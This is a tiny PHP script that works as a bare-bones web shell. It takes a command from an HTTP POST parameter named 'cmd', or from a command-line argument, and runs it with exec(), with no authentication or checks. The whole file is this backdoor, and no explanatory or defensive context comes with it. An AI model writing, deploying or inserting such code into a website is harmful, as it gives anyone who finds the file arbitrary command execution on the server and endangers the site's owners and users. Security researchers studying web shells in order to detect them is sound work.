<?php 

if (isset($_POST["cmd"])) $cmd=$_POST["cmd"];  
else $cmd="";

if (!empty($argv[1])) {
  $cmd=$argv[1];
  //echo($cmd);
}

if ($cmd!="") {
   exec($cmd);
}